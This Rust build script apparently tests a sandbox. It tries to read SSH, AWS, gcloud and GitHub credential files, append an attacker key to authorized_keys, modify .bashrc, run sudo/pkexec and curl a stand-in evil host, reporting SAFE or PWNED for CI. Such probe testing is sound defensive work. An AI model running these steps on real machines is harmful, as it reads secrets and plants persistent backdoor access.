//! Hostile build script — exercises every attack in `fixtures/ATTACKS.md`.
//!
//! Each probe prints exactly one of:
//!   cargo:warning=SAFE: <id> <reason>
//!   cargo:warning=PWNED: <id> <evidence>
//!
//! CI greps for PWNED: and fails on any occurrence.

use std::fs;
use std::process::{Command, Stdio};

fn home() -> String {
    std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_owned())
}

fn report(id: &str, ok: bool, msg: impl AsRef<str>) {
    let tag = if ok { "SAFE" } else { "PWNED" };
    println!("cargo:warning={}: {} {}", tag, id, msg.as_ref());
}

fn try_read(id: &str, path: String) {
    match fs::read_to_string(&path) {
        Ok(buf) if !buf.is_empty() => report(id, false, format!("read {} bytes from {path}", buf.len())),
        Ok(_) => report(id, true, format!("readable but empty: {path}")),
        Err(e) => report(id, true, format!("blocked: {e}")),
    }
}

fn try_append(id: &str, path: String, payload: &str) {
    use std::io::Write;
    let res = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .and_then(|mut f| f.write_all(payload.as_bytes()));
    match res {
        Ok(()) => report(id, false, format!("wrote to {path}")),
        Err(e) => report(id, true, format!("blocked: {e}")),
    }
}

fn try_exec(id: &str, program: &str, args: &[&str]) {
    let res = Command::new(program)
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();
    match res {
        Ok(o) if o.status.success() => {
            report(id, false, format!("exec {program} succeeded ({} bytes stdout)", o.stdout.len()))
        }
        Ok(_) => report(id, true, format!("exec {program} returned non-zero (likely sandboxed)")),
        Err(e) => report(id, true, format!("exec {program} blocked: {e}")),
    }
}

fn try_curl(id: &str, url: &str) {
    let res = Command::new("/usr/bin/curl")
        .args(["-sSL", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", url])
        .output();
    match res {
        Ok(o) => {
            let body = String::from_utf8_lossy(&o.stdout);
            let code = body.trim();
            if o.status.success() && code.starts_with('2') {
                report(id, false, format!("HTTP {code} from {url}"));
            } else {
                report(
                    id,
                    true,
                    format!("blocked: curl exit={:?} http={code}", o.status.code()),
                );
            }
        }
        Err(e) => report(id, true, format!("blocked: {e}")),
    }
}

fn main() {
    let home = home();
    try_read("ssh-read", format!("{home}/.ssh/id_ed25519"));
    try_read("aws-read", format!("{home}/.aws/credentials"));
    try_read("gcloud-read", format!("{home}/.config/gcloud/credentials.db"));
    try_read("gh-token-read", format!("{home}/.config/gh/hosts.yml"));
    try_read("env-read", "./.env".to_owned());
    try_append("bashrc-write", format!("{home}/.bashrc"), "\n# pwned\n");
    try_append(
        "authorized-keys-write",
        format!("{home}/.ssh/authorized_keys"),
        "\nssh-rsa AAAAATTACKER attacker@evil\n",
    );
    try_exec("sudo-exec", "/usr/bin/sudo", &["-l"]);
    try_exec("pkexec-exec", "/usr/bin/pkexec", &["--version"]);
    try_curl("curl-evil", "https://evil.example.invalid/");
}
